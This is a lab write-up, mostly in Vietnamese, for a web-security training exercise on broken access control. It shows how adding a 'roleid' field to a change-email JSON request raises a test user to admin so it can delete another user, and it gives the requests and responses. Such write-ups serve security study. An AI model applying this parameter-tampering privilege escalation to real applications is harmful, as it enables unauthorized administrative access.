@@ -1,0 +1,37 @@
+BROKEN ACCESS CONTROL: User role can be modified in user profile
+
+DESCRIBE: This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2. Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: wiener:peter
+
+ANALYSTIC
+---------
+Thực hiện truy cập vào lab và đăng nhập với tài khoản được cho trước. Ta thấy có hiển thị username và email: wiener@normal-user.net. Theo đề bài của lab này, ta thấy chỉ có thể truy cập được vào /admin nếu role của tài khoản là 2. Ta thử thực hiện thay đổi email của mình, sau đó vào history để quan sát request cũng như response khi thực hiện chức năng này. Ta thấy có 1 request có endpoint như sau: /my-account/change-email có nội dung của body như sau:
+{
+    "email":"wiener@administrator.net"
+}
+Ta thấy nội dung của request có dạng jason, chứa key và giá trị của nó. Quan sát response của nó ta có phần body của nó như sau:
+
+{
+  "username": "wiener",
+  "email": "wiener@administrator.net",
+  "apikey": "RPRMHJnvYaOwLizGsJA8CVig4JQnqQ4D",
+  "roleid": 1
+}
+Ta thấy ở đây có những thông tin có vẻ như của tài khoản này, trong đó có roleid có giá trị là 1. Ta thực hiện gửi request này tới repeater và thêm 1 cặp khóa giá trị vào body:
+{
+    "email":"wiener@administrator.net",
+    "roleid": 2
+}
+Sau khi gửi đi ta thấy có kết quả trả về như sau:
+HTTP/2 302 Found
+Location: /my-account
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 128
+
+{
+  "username": "wiener",
+  "email": "wiener@administrator.net",
+  "apikey": "RPRMHJnvYaOwLizGsJA8CVig4JQnqQ4D",
+  "roleid": 2
+}
+Ta thấy request đã thực hiện thành công và roleid đã được sửa. Lúc này ta thử truy cập lại /admin --> được và thực hiện xóa carlos để hoàn thành lab. 
